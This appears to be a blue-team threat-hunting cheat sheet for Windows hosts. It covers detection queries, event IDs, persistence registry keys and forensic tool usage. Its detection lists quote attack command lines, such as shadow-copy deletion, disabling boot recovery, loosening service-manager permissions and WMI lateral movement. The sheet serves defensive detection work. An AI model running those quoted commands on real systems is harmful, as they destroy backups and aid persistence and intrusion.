### Detection for unusual URLs / browsing activity

#### via Microsoft Windows Defender Advanced Threat Hunting / KQL

```
# Internet Explorer
DeviceNetworkEvents
| where DeviceName contains "testvm2"
| where InitiatingProcessFileName == "iexplore.exe"
| sort by Timestamp desc

# Microsoft Edge
DeviceNetworkEvents
| where DeviceName contains "testvm2"
| where InitiatingProcessFileName == "msedge.exe"
| sort by Timestamp desc

# Google Chrome
DeviceNetworkEvents
| where DeviceName contains "testvm2"
| where InitiatingProcessFileName == "chrome.exe"
| sort by Timestamp desc
```

Taken from [here](https://techcommunity.microsoft.com/t5/microsoft-defender-for-endpoint/get-users-browser-history-via-live-response/m-p/3950769)

#### via velociraptor \ Detectraptor.Windows.Detection.WebHistory files

- Looks for IOCs in the Webhistory logs
- DetectRaptor: `Detectraptor.Windows.Detection.WebHistory`


#### via History files

```
# Safari
/Users/[USERNAME]/Library/Safari/History.db

# Chrome
```

### Detection for creation of unusual Shadow Copies

Can detect the following scenarios: 
- `Backup Operators` abuse as described [here](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet?tab=readme-ov-file#abusing-backup-operators-group)

#### via Windows Event ID / Event ID 8222

```
# Look for unusual 'Process Image Name' values in the Description of the event and unusual Users that are not expected to perform this activity.
Provider=VSSAudit
EventID=8222 (Shadow copy has been created.)
```

### Detect for unusual Windows DNSServer Activity Logs

#### via Windows Audit Event Logs / 541

Can detect `DNSAdmins` abuse by overwriting of serverlevelplugindll on scope pointing to malicious DLL path

```
Event ID = 541
Channel = Microsoft-Windows-DNSServer/Audit
Provider = Microsoft-Windows-DNSServer
Description = "serverlevelplugindll on scope . has been set to $ARBITRARY_DLL_PATH"
```

### Detect for unusual Windows services creations

- Monitor for usage of new services which can be indicative of persistence techniques e.g. via modification of binary to system, dnsadmins. Some unusual service names can be: 
```
# Indicates a pivoting tunnel  from cloudflare, called cloudflared. See https://x.com/malmoeb/status/1736995855482118314?s=46&t=WvGY79Umt5enRwgCbi4TQQ, https://www.guidepointsecurity.com/blog/tunnel-vision-cloudflared-abused-in-the-wild/
CloudFlared agent
```

- Look for 'DNS Server' service name (e.g. has it entered the `start` state or not) for `DNSAdmins` abuse

- Detect for unusual kernel mode services and their names which is typically in the `Service Type` (eg `kernel mode driver`) field in Eveit ID `7045` OR `0x1` field in Event ID `4697`. Can be indicative of BYOVD services being installed such as NimBlackout

- Look for `spoolsv.exe` service being stopped which is usually associated with privilege escalation (event iD 7036). Ref: https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/
  
#### via Windows Sysmon Event Logs / 13

```
# replace $SERVICE_NAME to be anything 
EventID=13 (Registry value set)
Image=C:\Windows\system32\services.exe
Provider=Microsoft-Windows-Sysmon/Operational
TargetObject=HKLM\System\CurrentControlSet\Services\$SERVICE_NAME\Start
```

#### via Windows Event Logs / 7045 / 7036 / 7040 / 4697
```
# Look for 'DNS Server' service name (e.g. has it entered the `start` state or not) for `DNSAdmins` abuse
EventID=7045 (service was installed on system) OR EventID=7040 (The start type of the ... service was changed from auto start to demand start) OR EventID=7036 (The ... service entered the stopped state.)
Provider=Service Control Manager

OR

EventID=4697 (A service was installed in the system)
Provider=Microsoft-Windows-Security-Auditing
```

### via Registry Explorer / HKLM\CurrentControlSet\Services

Folder exists for each service under `HKLM\CurrentControlSet\Services` as explained [thedfirreport.com](https://thedfirreport.com/2024/06/10/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment/#persistence)

### Detect unusual network / firewall connections to LDAP ports

- Indicates LDAP enumeration occurring via tools like Bloodhound, SharpHound

#### via Windows Event Logs / Event ID 5156

```
EventID: 5156 (The Windows Filtering Platform has permitted a connection)
Channel: Security
Provider: Microsoft-Windows-Security-Auditing
(Network Information.Destination Port: 389 OR Network Information.Destination Port: 636)
```

### Detect unusual group membership enumeration

- Indicates LDAP enumeration occurring via tools like Bloodhound, SharpHound

#### via Windows Event Logs / Event ID 4799

```
# Observe changes for large number of groups (Group.Group Name) from same process (Process Information.Process Name)
EventID: 4799 (A security-enabled local group membership was enumerated)
Channel: Security
Provider: Microsoft-Windows-Security-Auditing
Group.Group Name: *
(Network Information.Destination Port: 389 OR Network Information.Destination Port: 636)
```

### Detect unusual file share usage

Monitor for usage of shares like `ADMIN$`, `IPC$`, `C$` and unusual file names which can be indicative of PsExec being used for access within the environment for file staging. See more info [here](https://research.splunk.com/endpoint/f63c34fe-a435-11eb-935a-acde48001122/)

#### via Windows Event Audit Logs / Event ID 5145

```
# 'Share Name' is the name of the share, and 'Relative Target Name' is the name of the file in the share
EventID=5145
Provider=Microsoft-Windows-Security-Auditing
```

### Detect unusual usb device insertions OR an external device

- Can display malicious USB drives / USB disks being inserted into the device eg `TinyPilot` has vendor as `TinyPilot`: https://tinypilotkvm.com/faq/target-detect-tinypilot/
- Can also detect via `EventID 6416` the introduction of a `A Generic Plug 'n Play Monitor` eg TinyPilot: https://tinypilotkvm.com/faq/target-detect-tinypilot/

#### via Windows Event Audit Logs / EventID 1006

```
# Contains Capacity, Model, Serial #
EventID=1006
Provider=Windows-Diagnostic-Parition
```

More info [here](https://mreerie.com/2022/02/05/bitlocker-connected-storage-devices/)

#### via Windows Event Audit Logs / EventID 6416

Detects USB Device Name, USB Device ID

```
EventID=6416
Provider=Microsoft-Windows-Security-Auditing
```

https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-6416

More info [here](https://www.manageengine.com/products/active-directory-audit/process-tracking-events/event-id-6416.html#:~:text=When%20the%20system%20recognizes%20a,event%20ID%206416%20is%20logged.)

#### via Windows Event Audit Logs / EventID 1, 4688

Look for keyword in file paths e.g.  `E:\.....png` 

#### via MountPoints2 Registry Key

Helps to identify unusual MountPoints2 Registry keys as present in `C:\Users\$USERNAME\NTUSER.DAT` registry file

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2
```

### Detect unusual startup programs aka autoruns

#### via trawler

```
# Recommend running on a golden image and then comparing the differences
cd C:\Users\azureuser\Desktop\opt\Trawler\Trawler-main
.\trawler.ps1
```

#### via persistencesniper

```
# Recommend running on a golden image and then comparing the differences
cd C:\Users\azureuser\Desktop\opt\PersistenceSniper\PersistenceSniper-main\PersistenceSniper
Import-Module .\PersistenceSniper.psd1
Find-AllPersistence
```

#### via wmic

```
wmic startup list full
```

https://www.jaiminton.com/cheatsheet/DFIR/#recentdocs-information

#### via sysinternals / autorunsc64.exe

```
# Pre-requisite: Requires Arsenal Image Mounter to take an image of the system
autorunsc64.exe -a * -c -h -s '*' -z C:\Windows C:\Users\Administrator
```

Taken from [here](https://www.sans.org/blog/offline-autoruns-revisited-auditing-malware-persistence/)

#### via sysinternals / autoruns64.exe

Start sysinternals > autoruns64.exe > File > `analyze offline systems...`

#### via dir 
```
# Potential Tasks file which are created can have backdoors eg .ps1, .cmd, .bat, .exe, .dll
dir /b /s C:\Windows\Tasks
```

### Look for interesting indicators in data 

#### via bulk_extractor

See [here](../linux_compromised_host/README.md#look-for-interesting-indicators-in-data)

### Detect for unusual powershell sessions

Look for interesting keywords in commands OR in powershell:

```
# interesting argument in commands normally observed
powershell.exe  -ExecutionPolicy Bypass

# Could be Intune based powershell execution / malware delivery: https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/
powershell.exe -NoProfile -executionPolicy bypass -file "C:\Program Files (x86)\Microsoft Intune Management Extension\Policies\Scripts\$GUID.../"

# To invoke commands on one or more computers
# Powershell remoting e.g. Invoke-Command -ComputerName $computer -ScriptBlock { ...<powershell code> } -ArgumentList ...
Invoke-Command -ComputerName $computer ...

# Look for attempts to delete powershell script file after it finishes executing
# https://x.com/malmoeb/status/1844627489420701769
Remove-Item $MyInvocation.MyCommand.Definition -Force
```

#### via Defender KQL / DeviceProcessEvents Table

```
union DeviceProcessEvents, DeviceNetworkEvents, DeviceEvents
| where Timestamp > ago(30m)
| where FileName in~ ("powershell.exe", "powershell_ise.exe")
```

#### via Defender KQL / DeviceEvents / PowerShellCommand Table

```
# Detects Powershell command from remote session and the name of the device
DeviceEvents
| where ActionType contains "PowerShellCommand"
| sort by TimeGenerated desc
| extend AdditionalFieldsJson = parse_json(AdditionalFields)
| project TimeGenerated, InitiatingProcessRemoteSessionDeviceName, Type, AdditionalFieldsJson.Command
```

#### via powershell module logging / event ID 4103

Usually 4104 (ScriptBlock text) ok for most unusual detections, Can be used to detect bypass for ScriptBlock logging attempts as documented in [dfir.ch](https://dfir.ch/posts/scriptblock_smuggling/)

```
Event ID = 4103 (CommandInvocation)
Channel = Microsoft-Windows-Powershell/Operational 
```

#### via windows process logging / event ID 1 with powershell.exe or pwsh.exe  

See [here](#detect-for-unusual-processes-and-parent-processes-created)

#### via scriptblocks / hayabusa / takajo

- To detect malicious script blocks automatically

```
cd /opt/hayabusa
./hayabusa json-timeline -L -d ~/samples/winlogs -o /tmp/jsontimeline.jsonl

cd /opt/takajo
./takajo extract-scriptblocks -t /tmp/jsontimeline.jsonl -l high -o /tmp/results
```

#### via powershell scriptblock logging / event ID 4104

```
# Look for TargetFileName, ProcessID fields (Process that created the key) AND Target Object
Event ID = 4104 (Creating ScriptBlock text)
Channel = Microsoft-Windows-PowerShell/Operational
```

Example Elastic Search:
```
cloud.instance.name:dc AND winlog.event_id:* AND (event.code:1 OR event.code:4104)
```

#### via PSReadline

- Looks for powershell commands executed via Command Line
```
type C:\Users\azureuser\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

#### via velociraptor / DetectRaptor / Windows.Detection.Powershell.PSReadline

- Velociraptor Artifact: `Windows.Detection.Powershell.PSReadline`, DetectRaptor: `DetectRaptor.Windows.Detection.Powershell.PSReadline`

### Detect for unusual processes and parent processes created

- Identify signs of lateral movement via various tools such as `impacket` via Parent Command Line and Command Line as documented in Purp1eW0lf's notes: https://github.com/Purp1eW0lf/Blue-Team-Notes/blob/main/Examples%20Of%20Lateral%20movement.md
- Look for suspicious LOLBAS Binaries or scripts: https://lolbas-project.github.io/lolbas/Binaries/ eg `tttracer.exe`
- Processes and parent process names to look for:
```
powershell.exe
# Suspicious VBS Executions. See https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.005/
cscript.exe
# Javascript execution. See https://detection.fyi/mbabinski/sigma-rules/2023_redcanary_threatdetectionreport/threat_gootloader_appdata_js_execution/
wscript.exe
# MSHTA Execution
mshta.exe
cmd.exe
pwsh.exe
# Eg Disabling of system restore by ransomware threat actors `schtasks.exe /change /TN "\Microsoft\Windows\SystemRestore\SR" /disable`
# Ref: SANS-608 Ransomware: Detect the Precursors)
schtasks.exe
scrcons.exe
regsvr32.exe
hh.exe

# Eg for deleting volume shadow copies: wmic.exe Shadowcopy Delete
wmic.exe
mshta.exe
msiexec.exe
bitsadmin.exe
certutil.exe

# Can be used by sysadmins OR even by backupoperators for malicious purposes. See: https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet?tab=readme-ov-file#abusing-backup-operators-group
diskshadow

# RDP / VNC connectivity possible
ngrok.exe
winvnc.exe

# https://medium.com/@0xcc00/bypassing-edr-ntds-dit-protection-using-blueteam-tools-1d161a554f9f
FTKImager.exe

# https://medium.com/@0xcc00/bypassing-edr-ntds-dit-protection-using-blueteam-tools-1d161a554f9f
DumpIt.exe

# Lateral movement detection via wmi with unusual commands, such as `cmd.exe /q /c [command] 1> \\127.0.0.1\admin$\__[file] 2>&1`
# Taken from: https://labs.withsecure.com/publications/attack-detection-fundamentals-discovery-and-lateral-movement-lab-5
wmiprvse.exe

# Look for -Embedding command line argument as it may indicate DComExec.py execution. More info: https://github.com/manasmbellani/Blue-Team-Notes/blob/main/Examples%20Of%20Lateral%20movement.md
# Look for DRSAT.exe in the parent process which can indicate invocation bypassing requirements of being domain-joined machine (using stored TGT from non-domain joined machine). More info: https://github.com/CCob/DRSAT
mmc.exe

# Indications of firewall being manipulated to open firewall ports
# Eg. for RDP based lateral movement: https://github.com/manasmbellani/Blue-Team-Notes/blob/main/Examples%20Of%20Lateral%20movement.md
netsh

# See detection [here](#detection-of-winrm-shell--powershell-remote-session) for Windows Powershell remoting
wsmprovhost.exe

# Ransomware related command eg sc config "Netbackup Legacy Network service" start= disabled
# Assignment of unusual permissions on service control manager eg `sc.exe sdset scmanager D:(A;;KA;;;WD)`. More info: https://0xv1n.github.io/posts/scmanager/
sc

# Ransomware command lines e.g. `bcdedit   /set {default}`, bcdedit   /set {default} recoveryenabled No to disable automatic repair
# References: https://www.tenforums.com/tutorials/90923-enable-disable-automatic-repair-windows-10-a.html
bcdedit

# Look for indications of back volume shadow copies being deleted eg vssadmin.exe Delete Shadows /all /quiet (Ref: FOR-608, Section 3: Modern Attack Techniques, Slide: Ransomware, Detect the Precursors)
# OR vssadmin  create shadow /for=C: for shadow copy creation for dumping hashes
vssadmin.exe

# Identified WERFault as parent process in image file execution options execution.
# More info here: https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/#:~:text=Image%20File%20Execution%20Options%20is,%E2%80%9CGlobalFlag%E2%80%9D%20for%20application%20debugging.
werfault.exe

# eg comsvcs.dll being leveraged to dump memory dump files. See https://lolbas-project.github.io/lolbas/Libraries/comsvcs/
rundll32

# Legitimate binaries being created by unusual processes eg. running in Downloads, Temp folder
# Can be indicative of Process Hollowing as seen in `Run of the Mill` `Ace Responder` exercise e.g
C:\Users\Administrator\Downloads\explore.exe -> C:\Windows\System32\notepad.exe OR iexplore.exe (Internet Explorer)

# Detection of PrintNightmare vulnerability (CVE-2021-1675) where print spooler process executes unusual DLLs
# Provider = Microsoft-Windows-PrintService/Admin, EventCode=808 shows the DLL being executed ("The print spooler failed to load a plug-in module...")
# https://www.splunk.com/en_us/blog/security/i-pity-the-spool-detecting-printnightmare-cve-2021-34527.html
C:\Windows\System32\spoolsv.exe -> C:\Windows\System32\rundll.exe

# Remote Monitoring tool seen by threat actors being used in campaigns as posted by Microsoft: https://www.microsoft.com/en-us/security/blog/2024/05/15/threat-actors-misusing-quick-assist-in-social-engineering-attacks-leading-to-ransomware/#:~:text=Threat%20actors%20misuse%20Quick%20Assist,access%20to%20a%20target%20device.
QuickAssist.exe

# Look for frequent Remote Management tools executables via https://lolrmm.io/api/rmm_tools.csv
```

Taken from here: [1](https://github.com/SigmaHQ/sigma/blob/master/other/godmode_sigma_rule.yml), [2](https://detection.fyi/sigmahq/sigma/windows/process_creation/proc_creation_win_susp_shell_spawn_susp_program/)

#### via Windows Event Logs / Sysmon / Event ID 1

```
# Look for TargetFileName, ProcessID fields (Process that created the key) AND Target Object
Event ID = 1 (Process Create)
Channel = Microsoft-Windows-Sysmon/Operational
```

#### via Windows Sysmon Event Logs / Event ID 13 / $SOME_TASK_NAME

```
EventID = 13 (Registry Value Set)
TargetObject = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\$SOME_TASK_NAME\Index
Channel = Security
```

#### via Windows Event Logs / Event ID 4688

```
# Look for New Process Name, New Process ID fields 
Event ID = 4688 (A new process has been created)
Channel = Security
```

#### via velocirpator / MFT / DetectRaptor / DetectRaptor.Windows.Detection.MFT

- Detects for unusual processes and parent processes created such as RMM tools, AD using regex
- Use the `DetectRaptor.Windows.Detection.MFT` to search for the files written to disk in the past or present

#### via hashes / hayabusa / takajo

- To check the virustotal for suspicious hashes, can consolidate all suspicious hashes

```
cd /opt/hayabusa
./hayabusa json-timeline -L -d ~/samples/winlogs -o /tmp/jsontimeline.jsonl

cd /opt/takajo
./takajo list-hashes -t /tmp/jsontimeline.jsonl -o /tmp/hashes.txt
```

#### via suspicious process / hayabusa / takajo 

```
cd /opt/hayabusa
./hayabusa json-timeline -L -d ~/samples/winlogs -o /tmp/jsontimeline.jsonl

cd /opt/takajo
./takajo timeline-suspicious-processes -t /tmp/jsontimeline.jsonl -o /tmp/sus_process.csv
```

### Detect for unusual process injections / migration into another process

- Can also detect tools like Disconnected-RSAT: https://github.com/CCob/DRSAT which launches mmc.exe, GPT.exe.

#### via Windows Sysmon Event Logs / Process Create (Event ID 1)

```
index=case-windows-logs (winlog.event_id=1) spoolsv.exe
```

Ref: as  seen in `Truly Graceful Wipeout`


#### via Windows Sysmon Event Logs / CreateRemoteThreat (EventID 8)

```
Channel = Microsoft-Windows-Sysmon/Operational
Event ID = 8 (CreateRemoteThread)
```

More info [learn.microsoft.com](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)

### Detect for unusual amcache entries

- Amcache stores the time, programs executed with SHA1 hash of the first 21MB of the programs run
- Can be used to detect unusual drivers being run based on the SHA1 hash via DetectRaptor artifacts (see below)

#### via EZTools / AmcacheParser

```
cd C:\Users\azureuser\Desktop\opt\EZTools\net6
.\AmcacheParser.exe -f C:\Windows\AppCompat\Programs\Amcache.hve --csv C:\Windows\Temp
```

https://thesecuritynoob.com/dfir-tools/dfir-tools-amcacheparser-what-is-it-how-to-use/

#### via velociraptor / DetectRaptor.Windows.Detection.LolDriversMalicious / DetectRaptor.Windows.Detection.LolDriversVulnerable

- Initiate the artifact `DetectRaptor.Windows.Detection.LolDriversMalicious` or `DetectRaptor.Windows.Detection.LolDriversVulnerable` for detecting drivers known to be malicious or vulnerable based on Amcache entries

### Detect for unusual drivers being loaded

- Look for known bad driver names:
```
# EDR Sandblast - https://github.com/0xAnalyst/DefenderATPQueries/blob/main/Defense%20Evasion/EDRSandblast.md
WN_64.sys
wnbios.sys
```
- Look for potential bad driver names linked with Loldrivers: https://www.loldrivers.io/drivers/8d97bb7f-e009-4dc7-ab9d-fde293e679dc/ being loaded

#### via Windows Sysmon Event ID 6 

```
# Look for ImageLoaded, Hashes, Signature (Signed By) and SignatureStatus
Event ID = 6 (Driver Loaded)
Channel = Microsoft-Windows-Sysmon/Operational
```

#### via Windows Event Logs 7045

```
# Look for 'Service File Name' for path which may be suspicious if outside C:\Windows\System32 paths (uncommon paths as an example)
Event ID = 7045 (A service was installed in the system)
Service Type = "kernel mode driver"
```

https://research.splunk.com/endpoint/9216ef3d-066a-4958-8f27-c84589465e62/

#### via Windows Event ID 3004 / 3023

```
# Detect for unusual code signing failures in kernel drivers which can indicate BYOVD drivers being loaded with invalid signatures or being blocked e.g NIMBlackout
Provider = Microsoft-Windows-CodeIntegrity
Channel = Microsoft-Windows-CodeIntegrity/Operational
EventID = 3023 (The driver ...\Blackout.sys is blocked from loading as the driver has been revoked by Microsoft) OR EventID = 3004 (kernel driver tried to load with an invalid signature)
```

#### via Microsoft Windows Defender / KQL / DriverEvents / DriverLoad

```
# Provides SHA1, SHA256 hashes of the kernel driver and the initiating process
DeviceEvents
| where ActionType == "DriverLoad"
| sort by TimeGenerated desc
```

### Detect for unusual file changes eg Files renamed, Malicious Files Written

Key files to look for include:

```
# Persistence locations
C:\Users\USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs

# Taken from: https://github.com/DCScoder/Noisy-Cricket/blob/main/Noisy_Cricket.ps1
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\

# Files being copied across aka exfiltration e.g. to `E:` drives as seen in `Airgapped` in `Aceresponder` challenge will create file in `E:` or other drive letters.
Search: event.code:11 AND winlog.event_data.TargetFilename: "E:"

# Look for files matching malicious bootloaders as loaded in bootloaders.io project as discussed below in `Velociraptor / DetectRaptor / Windows.Detection.Bootloaders`

# Look for files renamed on disk after Harddisk is removed for privilege escalation
# See: https://iwantmore.pizza/posts/arbitrary-write-accessibility-tools.html
# Use `Velociraptor / DetectRaptor / BinaryRename.template` to detect this (see below)

# Look for .sys driver files being written to disk where TargetfileName in Windows Event ID 11 contains `.sys` e.g. NIMBlackout OR `DeviceFileEvents` / FileName contains .sys

# Look for .RDP files being created in Outlook Attachments Folder \Content.Outlook\ in AppData\Windows which indicates Nobelium spearphishing using RDP files
# https://github.com/Neo23x0/signature-base/blob/master/iocs/filename-iocs.txt#L4422
# https://www.microsoft.com/en-us/security/blog/2024/10/29/midnight-blizzard-conducts-large-scale-spear-phishing-campaign-using-rdp-files/
\\Content\.Outlook\\[A-Z0-9]{8}\\[^\\]{1,255}\.rdp$

# Look for files created under web root folders eg for proxyshell
# https://m365internals.com/2022/10/18/hunting-and-responding-to-proxyshell-attacks/
# https://github.com/rod-trent/SentinelKQL/blob/master/ProxyShell.txt
C:\\inetpub\\wwwroot\\aspnet_client
```

#### via Windows USN Journal / Velociraptor / Windows.Carving.USN Artifact

- File Carving can be unreliable, it gets rotate within a day too
- See `Velociraptor` > Client Artifacts > `Windows.Carving.USN` artifact

More info: https://docs.velociraptor.app/blog/2021/2021-06-16-carving-usn-journal-entries-72d5c66971da/

#### via Windows USN Journal / Velociraptor / parse_usn

```
SELECT * FROM parse_usn(device="C:/") WHERE FullPath =~ "test.txt" LIMIT 10
```

https://docs.velociraptor.app/blog/2020/2020-11-13-the-windows-usn-journal-f0c55c9010e/

#### via Windows Event Logs / Sysmon / Event ID 11

```
# Look for TargetFileName, ProcessID fields (Process that created the key) AND Target Object
Event ID = 11 (File Create)
Channel = Microsoft-Windows-Sysmon/Operational
```

#### via Microsoft Defender / KQL / DeviceFileEvents

```
# Captures the SHA1 hash of the files created including `InitiatingProcessRemoteSessionDeviceName` if session was over RDP 
DeviceFileEvents
| where DeviceName contains "winde"
| sort by TimeGenerated desc
```


#### via Velociraptor / DetectRaptor / Windows.Detection.Bootloaders

https://github.com/mgreen27/DetectRaptor?tab=readme-ov-file

#### via Velociraptor / DetectRaptor / Windows.Detection.BinaryRename

https://github.com/mgreen27/DetectRaptor/blob/master/templates/BinaryRename.template

### Detect unusual registry key created or updates

Keys to look for include: 
```
# Boot or Logon Autostart Execution: Registry Run Keys, https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md#atomic-test-1---reg-key-run
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend

# Persistence Mechanism via registry keys: https://github.com/DCScoder/Noisy-Cricket/blob/main/Noisy_Cricket.ps1
HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

# AutoProxyTypes, taken from: https://www.hexacorn.com/blog/2017/10/05/beyond-good-ol-run-key-part-66/
HKCR\AutoProxyTypes

# Look for changes to 'Security Packages' in the registry below to detect custom SSP creation
# Taken from: https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet?tab=readme-ov-file#custom-ssp
HKLM\System\CurrentControlSet\Control\Lsa\OSConfig\
HKLM\System\CurrentControlSet\Control\Lsa\

# Persistence Mechansims via Registry keys taken from: https://github.com/persistence-info/persistence-info.github.io/blob/main/Data/diskcleanuphandler.md
`HKCR\CLSID\{52A2AAAE-085D-4187-97EA-8C30DB990436}\InprocServer32`
`HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\`
`HKCR\CLSID`
`HKCU\Control Panel\Desktop`
`HKCU\Environment`
`HKCU\Environment` set `UserInitMprLogonScript`
`HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
`HKCU\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services`
`HKCU\Software\Microsoft\Command Processor\AutoRun`
`HKCU\Software\Microsoft\HtmlHelp Author`
`HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows`
`HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
`HKCU\txtfile\shell\open\command`
`HKLM\SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\`
`HKLM\SOFTWARE\Classes\CLSID`
`HKLM\SOFTWARE\Classes`
`HKLM\SOFTWARE\Microsoft\AMSI\Providers`
`HKLM\SOFTWARE\Microsoft\Cryptography\OID`
`HKLM\SOFTWARE\Microsoft\Cryptography\Providers`
`HKLM\SOFTWARE\Microsoft\NetSh`
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug`
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController`

# Detect Image File Execution Option Persistence
# More info: https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/#:~:text=Image%20File%20Execution%20Options%20is,%E2%80%9CGlobalFlag%E2%80%9D%20for%20application%20debugging.
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\`
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`
'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit'

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions`
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` registry key, the exe will be loaded by the `winlogon.exe`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\`
`HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services`
`HKLM\SYSTEM\CurrentControlSet\Control\BootVerificationProgram`
`HKLM\SYSTEM\CurrentControlSet\Control\LsaExtensionConfig\LsaSrv`
`HKLM\SYSTEM\CurrentControlSet\Control\Lsa`
`HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order`
`HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors`
`HKLM\SYSTEM\CurrentControlSet\Control\Session Manager`
`HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\StartupPrograms`
`HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp`
`HKLM\SYSTEM\CurrentControlSet\Services\<...>\NetworkProvider`
`HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters`
`HKLM\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\AutodialDLL`
`HKLM\SYSTEM\CurrentControlSet\Services`
`HKLM\Software\Classes`
`HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify`
`HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs\ Debugger = <executable>`
`HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs`
`HKLM\System\CurrentControlSet\Control\ContentIndex\Language\English_UK`
`HKLM\System\CurrentControlSet\Control\ContentIndex\Language\English_US`
`HKLM\System\CurrentControlSet\Control\ContentIndex\Language\Neutral`
`HKLM\System\CurrentControlSet\Control\ContentIndex\Language`

# Detect DNSAdmins abuse where ServerLevelPluginDll contains the path to the DLL
HKLM:\SYSTEM:\CurrentControlSet:\services\DNS\Parameters\ServerLevelPluginDll

# Changes to a service's image path (which binary is executed) which can execute malicious payload
# Replace the service name in the `ImagePath`. Note usage of `sc` causes services.exe in Sysmon Event ID 13 to generate services.exe executions.
# Ref: https://github.com/Mr-Un1k0d3r/SCShell
HKLM\System\CurrentControlSet\Services\*\ImagePath
```

#### via Windows Event Logs / Sysmon / Event ID 13

```
# Look for Image, ProcessID fields (Process that created the key) AND Target Object, which is the registry key set
Event ID = 13 (Registry Value Set)
Channel = Microsoft-Windows-Sysmon/Operational
```

### Detect successful network sessions

- A session is recorded when a user at a client successfully contacts a server
- A successful session occurs when the two computers are on the same network and the user has a user name and password that are accepted by the server. 

#### via net

```
net view \\127.0.0.1
```

### Detect Windows SMB Shares Exposed on the network

#### via powershell / Get-SmbShare

```
Get-SmbShare
```

#### via net

```
net view \\127.0.0.1
```

### Detection of WinRM Shell / PowerShell Remote Session

Detects if someone is using Invoke-PSRemoting based commands or `evil-winrm`

#### via Powershell / Get-WSManInstance

```
# Run on the local host where shell was created
# Shows the username, clientIP from which connections came
# Use [System.XML.XmlConvert]::toTimeSpan(...) to convert ShellRuneTime and other attributes
Get-WSManInstance -ResourceUri Shell -Enumerate
```

Taken from [here](https://jdhitsolutions.com/blog/powershell/7712/answering-the-wsman-powershell-challenge/)

#### via Windows Sysmon Event Logs / 4688 (A new process has been created)

```
Provider = Microsoft-Windows-Security-Auditing
EventID = 4688
New Process Name = *\wsmprovhost.exe
```

#### via Windows Sysmon Event Logs / 1 (Process Create)

```
Channel = Microsoft-Windows-Sysmon/Operational
EventID = 1 (Process Create)
CommandLine = "C:\Windows\system32\wsmprovhost.exe*"
```

#### via Windows Event Logs / 91 (Creating WSMan shell)

```
# Example: Creating WSMan shell on server with ResourceUri: http://schemas.microsoft.com/powershell/Microsoft.PowerShell (HACKER\Administrator clientIP: 10.128.0.57)
Channel = Microsoft-Windows-WinRM/Operational
EventID = 91
Description = "*Creating WSMan shell*"
```

### Detection of unusual ADCS certificate requests / Active Directory Certificate Services Abuse - SAN Template Certificates (ESC1/ESC3)

- Typically, Extended Key Usage (EKU) attributes are used to define how a Public-private key pair generate for a user  can be used.
- Compromise Type 1: If attacker steals Bob’s private key and certificate, and the certificate has an authentication EKU, the attacker can authenticate to the AD domain without knowing Bob’s password
- Compromise Type 2 (ESC1): If a template with an authentication EKU lets low-privilege users specify SANs, an attacker can authenticate as any user in the SAN (eg for a cert with user "Alice", attacker can specify a domain admin account e.g. ace@aceresponder.com)
- Pre-requisites for ESC1:
